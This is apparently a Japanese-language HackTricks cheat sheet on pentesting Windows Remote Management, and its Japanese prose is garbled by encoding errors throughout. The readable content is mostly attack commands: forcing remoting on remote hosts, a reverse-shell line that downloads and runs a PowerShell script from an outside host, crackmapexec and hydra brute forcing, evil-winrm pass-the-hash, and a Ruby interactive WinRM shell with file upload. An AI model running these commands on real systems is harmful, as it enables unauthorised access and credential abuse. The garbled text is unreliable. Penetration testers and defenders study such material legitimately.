# 5985,5986 - WinRMã®ãƒšãƒ³ãƒ†ã‚¹ãƒˆ

<details>

<summary><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•ï¼š

- **HackTricksã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„**ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
- [**å…¬å¼PEASSï¼†HackTricksã‚¹ãƒ¯ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã‚‹
- **ğŸ’¬ [Discordã‚°ãƒ«ãƒ¼ãƒ—](https://discord.gg/hRep4RUj7f)**ã«å‚åŠ ã™ã‚‹ã‹ã€[telegramã‚°ãƒ«ãƒ¼ãƒ—](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹
- **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[HackTricks](https://github.com/carlospolop/hacktricks)ã¨[HackTricks Cloud](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„**

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

çµŒé¨“è±Šå¯Œãªãƒãƒƒã‚«ãƒ¼ã‚„ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ãƒãƒ³ã‚¿ãƒ¼ã¨ã‚³ãƒŸãƒ¥ãƒ‹ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å–ã‚‹ãŸã‚ã«[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)ã‚µãƒ¼ãƒãƒ¼ã«å‚åŠ ã—ã¾ã—ã‚‡ã†ï¼

**ãƒãƒƒã‚­ãƒ³ã‚°ã®æ´å¯Ÿ**\
ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚¹ãƒªãƒ«ã¨ãƒãƒ£ãƒ¬ãƒ³ã‚¸ã«æ·±ãå…¥ã‚Šè¾¼ã‚€ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã«å‚åŠ ã™ã‚‹

**ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ãƒãƒƒã‚¯ãƒ‹ãƒ¥ãƒ¼ã‚¹**\
ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ã®ãƒ‹ãƒ¥ãƒ¼ã‚¹ã¨æ´å¯Ÿã‚’é€šã˜ã¦ã€ãƒãƒƒã‚­ãƒ³ã‚°ã®ä¸–ç•Œã‚’è¿½ã„ã‹ã‘ã‚‹

**æœ€æ–°ã®ã‚¢ãƒŠã‚¦ãƒ³ã‚¹ãƒ¡ãƒ³ãƒˆ**\
æœ€æ–°ã®ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ã®é–‹å§‹ã‚„é‡è¦ãªãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã®ã‚¢ãƒƒãƒ—ãƒ‡ãƒ¼ãƒˆã«ã¤ã„ã¦çŸ¥ã‚‹

**[Discord](https://discord.com/invite/N3FrSbmwdy)ã«å‚åŠ ã—ã¦ã€ä»Šæ—¥ã‹ã‚‰ãƒˆãƒƒãƒ—ãƒãƒƒã‚«ãƒ¼ã¨å”åŠ›ã‚’å§‹ã‚ã¾ã—ã‚‡ã†ï¼**

## WinRM

[Windows Remote Management](https://msdn.microsoft.com/en-us/library/windows/desktop/aa384426\(v=vs.85\).aspx)ï¼ˆWinRMï¼‰ã¯ã€SOAPã‚’ä½¿ç”¨ã—ã¦HTTPï¼ˆSï¼‰çµŒç”±ã§Windowsãƒã‚·ãƒ³ã®ãƒªãƒ¢ãƒ¼ãƒˆç®¡ç†ã‚’å¯èƒ½ã«ã™ã‚‹Microsoftãƒ—ãƒ­ãƒˆã‚³ãƒ«ã§ã™ã€‚ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ã§ã¯WMIã‚’åˆ©ç”¨ã—ã¦ã„ã‚‹ãŸã‚ã€WMIã®HTTPãƒ™ãƒ¼ã‚¹ã®APIã¨è€ƒãˆã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ãƒã‚·ãƒ³ã§WinRMãŒæœ‰åŠ¹ã«ãªã£ã¦ã„ã‚‹å ´åˆã€PowerShellã‹ã‚‰ãƒªãƒ¢ãƒ¼ãƒˆã§ãƒã‚·ãƒ³ã‚’ç®¡ç†ã™ã‚‹ã“ã¨ã¯ç°¡å˜ã§ã™ã€‚å®Ÿéš›ã€ãƒªãƒ¢ãƒ¼ãƒˆã®PowerShellã‚»ãƒƒã‚·ãƒ§ãƒ³ã«å…¥ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆã¾ã‚‹ã§SSHã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹ã‹ã®ã‚ˆã†ã«ï¼ï¼‰

WinRMãŒåˆ©ç”¨å¯èƒ½ã‹ã©ã†ã‹ã‚’æ¤œå‡ºã™ã‚‹æœ€ã‚‚ç°¡å˜ãªæ–¹æ³•ã¯ã€ãƒãƒ¼ãƒˆãŒé–‹ã‹ã‚Œã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹ã“ã¨ã§ã™ã€‚WinRMã¯æ¬¡ã®ã„ãšã‚Œã‹ã®ãƒãƒ¼ãƒˆã§ãƒªãƒƒã‚¹ãƒ³ã—ã¾ã™ï¼š

- **5985/tcpï¼ˆHTTPï¼‰**
- **5986/tcpï¼ˆHTTPSï¼‰**

ã“ã‚Œã‚‰ã®ãƒãƒ¼ãƒˆã®ã„ãšã‚Œã‹ãŒé–‹ã„ã¦ã„ã‚‹å ´åˆã€WinRMãŒæ§‹æˆã•ã‚Œã¦ãŠã‚Šã€ãƒªãƒ¢ãƒ¼ãƒˆã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’è©¦ã™ã“ã¨ãŒã§ãã¾ã™ã€‚

## **WinRMã‚»ãƒƒã‚·ãƒ§ãƒ³ã®é–‹å§‹**ã€‚

PowerShellã‚’WinRMã¨é€£æºã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚Microsoftã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã«ã‚ˆã‚‹ã¨ã€Enable-PSRemotingã¯ã€ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ãƒ¼ã‚’PowerShellãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒãƒ³ãƒ‰ã‚’å—ä¿¡ã™ã‚‹ã‚ˆã†ã«æ§‹æˆã™ã‚‹ã‚³ãƒãƒ³ãƒ‰ãƒ¬ãƒƒãƒˆã§ã™ã€‚è¢«å®³è€…ã®ã‚¨ãƒ¬ãƒ™ãƒ¼ã‚·ãƒ§ãƒ³ã•ã‚ŒãŸPowerShellãƒ—ãƒ­ãƒ³ãƒ—ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹å ´åˆã€ã“ã‚Œã‚’æœ‰åŠ¹ã«ã—ã€ã€Œæ”»æ’ƒè€…ã€ã‚’ä¿¡é ¼ã•ã‚ŒãŸãƒ›ã‚¹ãƒˆã¨ã—ã¦è¿½åŠ ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚æ¬¡ã®2ã¤ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã§ãã¾ã™ï¼š
```
Enable-PSRemoting -Force
Set-Item wsman:\localhost\client\trustedhosts *
```
ã“ã‚Œã¯trustedhostsè¨­å®šã«ãƒ¯ã‚¤ãƒ«ãƒ‰ã‚«ãƒ¼ãƒ‰ã‚’è¿½åŠ ã—ã¾ã™ã€‚ãã‚ŒãŒä½•ã‚’æ„å‘³ã™ã‚‹ã‹æ³¨æ„ã—ã¦ãã ã•ã„ã€‚_æ³¨æ„: æ”»æ’ƒãƒã‚·ãƒ³ã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¿ã‚¤ãƒ—ã‚’ã€ŒPublicã€ã‹ã‚‰ã€ŒWorkã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã«å¤‰æ›´ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã—ãŸã€‚_

ã¾ãŸã€**ãƒªãƒ¢ãƒ¼ãƒˆ**ã§WinRMã‚’**ã‚¢ã‚¯ãƒ†ã‚£ãƒ–åŒ–**ã™ã‚‹ã«ã¯ã€_wmic_ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚
```
wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"
```
### è¨­å®šãŒã•ã‚Œã¦ã„ã‚‹ã‹ãƒ†ã‚¹ãƒˆã™ã‚‹

æ”»æ’ƒãƒã‚·ãƒ³ãŒè¨­å®šã•ã‚ŒãŸã‚‰ã€`Test-WSMan` é–¢æ•°ã‚’ä½¿ç”¨ã—ã¦ã‚¿ãƒ¼ã‚²ãƒƒãƒˆãŒ WinRM ã«è¨­å®šã•ã‚Œã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ãƒ†ã‚¹ãƒˆã—ã¾ã™ã€‚ãƒ—ãƒ­ãƒˆã‚³ãƒ«ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã¨ wsmid ã«é–¢ã™ã‚‹æƒ…å ±ãŒè¿”ã•ã‚Œã‚‹ã¯ãšã§ã™:

![](<../.gitbook/assets/image (161) (1).png>)

![](<../.gitbook/assets/image (162).png>)

ã“ã®å ´åˆã€æœ€åˆã®ç”»åƒã¯è¨­å®šã•ã‚Œã¦ãŠã‚Šã€2ç•ªç›®ã®ç”»åƒã¯è¨­å®šã•ã‚Œã¦ã„ã¾ã›ã‚“ã€‚

### ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹

ã“ã‚Œã§ã€PowerShell ã® `Invoke-Command` ã‚’ä½¿ç”¨ã—ã¦ã€WinRM ã‚’ä»‹ã—ã¦ã‚¿ãƒ¼ã‚²ãƒƒãƒˆä¸Šã§ã‚³ãƒãƒ³ãƒ‰ã‚’ãƒªãƒ¢ãƒ¼ãƒˆã§å®Ÿè¡Œã§ãã¾ã™ã€‚ãƒªãƒ¢ãƒ¼ãƒˆã§ `ipconfig` ã‚’å®Ÿè¡Œã—ã¦å‡ºåŠ›ã‚’è¡¨ç¤ºã—ã¾ã™:
```
Invoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} [-credential DOMAIN\username]
```
![](<../.gitbook/assets/image (163) (1).png>)

ã‚ãªãŸã¯**Invoke-Command**ã‚’ä»‹ã—ã¦ç¾åœ¨ã®PSã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚ãƒ­ãƒ¼ã‚«ãƒ«ã«**enumeration**ã¨ã„ã†é–¢æ•°ãŒã‚ã‚‹ã¨ä»®å®šã—ã€ãã‚Œã‚’ãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ã§å®Ÿè¡Œã—ãŸã„å ´åˆã€æ¬¡ã®ã‚ˆã†ã«ã—ã¾ã™ï¼š
```ruby
Invoke-Command -ComputerName <computername> -ScriptBLock ${function:enumeration} [-ArgumentList "arguments"]
```
### ã‚¹ã‚¯ãƒªãƒ—ãƒˆã®å®Ÿè¡Œ
```ruby
Invoke-Command -ComputerName <computername> -FilePath C:\path\to\script\file [-credential CSCOU\jarrieta]
```
### é€†ã‚·ã‚§ãƒ«ã‚’å–å¾—
```ruby
Invoke-Command -ComputerName <computername> -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"}
```
### PSã‚»ãƒƒã‚·ãƒ§ãƒ³ã®å–å¾—

ã¾ãŸã¯ã€å¯¾è©±å‹ã®PowerShellã‚»ãƒƒã‚·ãƒ§ãƒ³ã«ã™ãã«ç§»å‹•ã—ãŸã„å ´åˆã¯ã€`Enter-PSSession`é–¢æ•°ã‚’ä½¿ç”¨ã—ã¾ã™ï¼š
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

# Enter
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local [-Credential username]
## Bypass proxy
Enter-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
# Save session in var
$sess = New-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
## Background current PS session
Exit-PSSession # This will leave it in background if it's inside an env var (New-PSSession...)
```
![](<../.gitbook/assets/image (164).png>)

**ã‚»ãƒƒã‚·ãƒ§ãƒ³ã¯ã€ã€Œè¢«å®³è€…ã€å†…ã®æ–°ã—ã„ãƒ—ãƒ­ã‚»ã‚¹ï¼ˆwsmprovhostï¼‰ã§å®Ÿè¡Œã•ã‚Œã¾ã™**

### **WinRMã‚’å¼·åˆ¶çš„ã«ã‚ªãƒ¼ãƒ—ãƒ³ã«ã™ã‚‹**

æœ¬å½“ã«PS Remotingã¨WinRMã‚’ä½¿ç”¨ã—ãŸã„ãŒã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆãŒãã‚Œã«è¨­å®šã•ã‚Œã¦ã„ãªã„å ´åˆã€1ã¤ã®ã‚³ãƒãƒ³ãƒ‰ã§ãã‚Œã‚’ã€Œå¼·åˆ¶çš„ã«ã€ã‚ªãƒ³ã«ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã¯ãŠå‹§ã‚ã—ã¾ã›ã‚“ãŒã€æœ¬å½“ã«WinRMã¾ãŸã¯PSRemotingã‚’ä½¿ç”¨ã—ãŸã„å ´åˆã¯ã€ã“ã®æ–¹æ³•ã§è¡Œã£ã¦ãã ã•ã„ã€‚ãŸã¨ãˆã°ã€PSExecã‚’ä½¿ç”¨ã—ã¦æ¬¡ã®ã‚ˆã†ã«ã—ã¾ã™ï¼š
```
PS C:\tools\SysinternalsSuite> .\PsExec.exe \\computername -u domain\username -p password -h -d powershell.exe "enable-psremoting -force"
```
### ã‚»ãƒƒã‚·ãƒ§ãƒ³ã®ä¿å­˜ã¨å¾©å…ƒ

ã“ã‚Œã¯ã€ãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ã§è¨€èªãŒåˆ¶ç´„ã•ã‚Œã¦ã„ã‚‹å ´åˆã«ã¯æ©Ÿèƒ½ã—ã¾ã›ã‚“ã€‚
```ruby
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

#You can save a session inside a variable
$sess1 = New-PSSession -ComputerName <computername> [-SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)]
#And restore it at any moment doing
Enter-PSSession -Session $sess1
```
ã“ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³å†…ã§ã¯ã€_Invoke-Command_ ã‚’ä½¿ç”¨ã—ã¦ PS ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ãƒ­ãƒ¼ãƒ‰ã§ãã¾ã™ã€‚
```ruby
Invoke-Command -FilePath C:\Path\to\script.ps1 -Session $sess1
```
### ã‚¨ãƒ©ãƒ¼

æ¬¡ã®ã‚¨ãƒ©ãƒ¼ãŒè¦‹ã¤ã‹ã£ãŸå ´åˆï¼š

`enter-pssession : ãƒªãƒ¢ãƒ¼ãƒˆ ã‚µãƒ¼ãƒãƒ¼ 10.10.10.175 ã«æ¥ç¶šã§ãã¾ã›ã‚“ã§ã—ãŸã€‚æ¬¡ã®ã‚¨ãƒ©ãƒ¼ ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãŒè¡¨ç¤ºã•ã‚Œã¾ã—ãŸ: WinRM ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã¯è¦æ±‚ã‚’å‡¦ç†ã§ãã¾ã›ã‚“ã€‚èªè¨¼ã‚¹ã‚­ãƒ¼ãƒ ãŒ Kerberos ã¨ç•°ãªã‚‹å ´åˆã€ã¾ãŸã¯ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆ ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ãƒ¼ãŒãƒ‰ãƒ¡ã‚¤ãƒ³ã«å‚åŠ ã—ã¦ã„ãªã„å ´åˆã¯ã€HTTPS ãƒˆãƒ©ãƒ³ã‚¹ãƒãƒ¼ãƒˆã‚’ä½¿ç”¨ã™ã‚‹ã‹ã€å®›å…ˆãƒã‚·ãƒ³ã‚’ TrustedHosts æ§‹æˆè¨­å®šã«è¿½åŠ ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚TrustedHosts ã‚’æ§‹æˆã™ã‚‹ã«ã¯ã€winrm.cmd ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚TrustedHosts ãƒªã‚¹ãƒˆã«ã‚ã‚‹ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ãƒ¼ã¯èªè¨¼ã•ã‚Œãªã„å ´åˆãŒã‚ã‚Šã¾ã™ã€‚æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ã¦è©³ç´°æƒ…å ±ã‚’å–å¾—ã§ãã¾ã™: winrm help configã€‚è©³ç´°ã«ã¤ã„ã¦ã¯ã€about_Remote_Troubleshooting ãƒ˜ãƒ«ãƒ— ãƒˆãƒ”ãƒƒã‚¯ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚`

ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã§æ¬¡ã®æ‰‹é †ã‚’è©¦ã—ã¦ãã ã•ã„ï¼ˆ[ã“ã¡ã‚‰](https://serverfault.com/questions/657918/remote-ps-session-fails-on-non-domain-server)ã‹ã‚‰ã®æƒ…å ±ï¼‰:
```ruby
winrm quickconfig
winrm set winrm/config/client '@{TrustedHosts="Computer1,Computer2"}'
```
<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) ã‚µãƒ¼ãƒãƒ¼ã«å‚åŠ ã—ã¦ã€çµŒé¨“è±Šå¯Œãªãƒãƒƒã‚«ãƒ¼ã‚„ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ãƒãƒ³ã‚¿ãƒ¼ã¨ã‚³ãƒŸãƒ¥ãƒ‹ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å–ã‚Šã¾ã—ã‚‡ã†ï¼

**ãƒãƒƒã‚­ãƒ³ã‚°ã®æ´å¯Ÿ**\
ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚¹ãƒªãƒ«ã¨ãƒãƒ£ãƒ¬ãƒ³ã‚¸ã«æ·±ãå…¥ã‚Šè¾¼ã‚€ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã«å‚åŠ ã—ã¾ã—ã‚‡ã†

**ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ãƒãƒƒã‚¯ãƒ‹ãƒ¥ãƒ¼ã‚¹**\
ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ã®ãƒ‹ãƒ¥ãƒ¼ã‚¹ã¨æ´å¯Ÿã‚’é€šã˜ã¦ã€ãƒãƒƒã‚­ãƒ³ã‚°ã®ä¸–ç•Œã‚’è¿½ã„ã‹ã‘ã¾ã—ã‚‡ã†

**æœ€æ–°ã®ãŠçŸ¥ã‚‰ã›**\
æœ€æ–°ã®ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ã®é–‹å§‹ã‚„é‡è¦ãªãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã®ã‚¢ãƒƒãƒ—ãƒ‡ãƒ¼ãƒˆã«ã¤ã„ã¦æƒ…å ±ã‚’å¾—ã¾ã—ã‚‡ã†

**[Discord](https://discord.com/invite/N3FrSbmwdy)** ã«å‚åŠ ã—ã¦ã€ä»Šæ—¥ã‹ã‚‰ãƒˆãƒƒãƒ—ãƒãƒƒã‚«ãƒ¼ã¨å”åŠ›ã—ã¾ã—ã‚‡ã†ï¼

## Linux ã§ã® WinRM æ¥ç¶š

### ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹

WinRM ã®ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã«ã¯æ³¨æ„ãŒå¿…è¦ã§ã™ã€‚
```ruby
#Brute force
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt

#Just check a pair of credentials
# Username + Password + CMD command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -H <HASH> -X '$PSVersionTable'
#Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm
```
### æ‚ªæ„ã®ã‚ã‚‹winrmã®ä½¿ç”¨
```ruby
gem install evil-winrm
```
**ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ**ã¯ã“ã¡ã‚‰ã®GitHubã§ç¢ºèªã§ãã¾ã™: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
```ruby
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>
```
### evil-winrmã‚’ä½¿ç”¨ã—ã¦IPv6ã‚¢ãƒ‰ãƒ¬ã‚¹ã«æ¥ç¶šã™ã‚‹ã«ã¯ã€_**/etc/hosts**_å†…ã«**ãƒ‰ãƒ¡ã‚¤ãƒ³å**ã‚’IPv6ã‚¢ãƒ‰ãƒ¬ã‚¹ã«è¨­å®šã—ã¦ã€ãã®ãƒ‰ãƒ¡ã‚¤ãƒ³ã«æ¥ç¶šã—ã¾ã™ã€‚

### evil-winrmã‚’ä½¿ç”¨ã—ã¦ãƒãƒƒã‚·ãƒ¥ã‚’æ¸¡ã™
```ruby
evil-winrm -u <username> -H <Hash> -i <IP>
```
### PS-docker ãƒã‚·ãƒ³ã®ä½¿ç”¨

PS-docker ãƒã‚·ãƒ³ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€WinRM ã‚µãƒ¼ãƒ“ã‚¹ã‚’ä»‹ã—ã¦ãƒªãƒ¢ãƒ¼ãƒˆã§ PowerShell ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚WinRM ã‚µãƒ¼ãƒ“ã‚¹ã¯ã€Windows ãƒã‚·ãƒ³é–“ã§ã®ãƒªãƒ¢ãƒ¼ãƒˆç®¡ç†ã‚’å¯èƒ½ã«ã™ã‚‹ãŸã‚ã®æ©Ÿèƒ½ã§ã™ã€‚PS-docker ãƒã‚·ãƒ³ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€WinRM ã‚’ä»‹ã—ã¦ãƒªãƒ¢ãƒ¼ãƒˆã§ PowerShell ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å®Ÿè¡Œã—ã€ã‚·ã‚¹ãƒ†ãƒ ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚
```
docker run -it quickbreach/powershell-ntlm
$creds = Get-Credential
Enter-PSSession -ComputerName 10.10.10.149 -Authentication Negotiate -Credential $creds
```
### ãƒ«ãƒ“ãƒ¼ã‚¹ã‚¯ãƒªãƒ—ãƒˆã®ä½¿ç”¨

**ã“ã“ã‹ã‚‰æŠ½å‡ºã—ãŸã‚³ãƒ¼ãƒ‰: [https://alamot.github.io/winrm\_shell/](https://alamot.github.io/winrm\_shell/)**
```ruby
require 'winrm-fs'

# Author: Alamot
# To upload a file type: UPLOAD local_path remote_path
# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt
# https://alamot.github.io/winrm_shell/


conn = WinRM::Connection.new(
endpoint: 'https://IP:PORT/wsman',
transport: :ssl,
user: 'username',
password: 'password',
:no_ssl_peer_verification => true
)


class String
def tokenize
self.
split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
select {|s| not s.empty? }.
map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
end
end


command=""
file_manager = WinRM::FS::FileManager.new(conn)


conn.shell(:powershell) do |shell|
until command == "exit\n" do
output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
print(output.output.chomp)
command = gets
if command.start_with?('UPLOAD') then
upload_command = command.tokenize
print("Uploading " + upload_command[1] + " to " + upload_command[2])
file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|
puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")
end
command = "echo `nOK`n"
end
output = shell.run(command) do |stdout, stderr|
STDOUT.print(stdout)
STDERR.print(stderr)
end
end
puts("Exiting with code #{output.exitcode}")
end
```
## Shodan

* `port:5985 Microsoft-HTTPAPI`

## References

* [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)

## HackTricks Automatic Commands
```
Protocol_Name: WinRM    #Protocol Abbreviation if there is one.
Port_Number:  5985     #Comma separated if there is more than one.
Protocol_Description: Windows Remote Managment        #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for WinRM
Note: |
Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.

sudo gem install winrm winrm-fs colorize stringio
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p â€˜MySuperSecr3tPass123!â€™

https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/

ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!' -e /root/Desktop/Machines/HTB/Resolute/
^^so you can upload binary's from that directory        or -s to upload scripts (sherlock)
menu
invoke-binary `tab`

#python3
import winrm
s = winrm.Session('windows-host.example.com', auth=('john.smith', 'secret'))
print(s.run_cmd('ipconfig'))
print(s.run_ps('ipconfig'))

https://book.hacktricks.xyz/pentesting/pentesting-winrm

Entry_2:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} rdp://{IP}
```
â€‹

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) ã‚µãƒ¼ãƒãƒ¼ã«å‚åŠ ã—ã¦ã€çµŒé¨“è±Šå¯Œãªãƒãƒƒã‚«ãƒ¼ã‚„ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ãƒãƒ³ã‚¿ãƒ¼ã¨ã‚³ãƒŸãƒ¥ãƒ‹ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å–ã‚Šã¾ã—ã‚‡ã†ï¼

**ãƒãƒƒã‚­ãƒ³ã‚°ã®æ´å¯ŸåŠ›**\
ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚¹ãƒªãƒ«ã¨ãƒãƒ£ãƒ¬ãƒ³ã‚¸ã«æ·±ãå…¥ã‚Šè¾¼ã‚€ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã«å‚åŠ ã—ã¾ã—ã‚‡ã†

**ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ãƒãƒƒã‚¯ãƒ‹ãƒ¥ãƒ¼ã‚¹**\
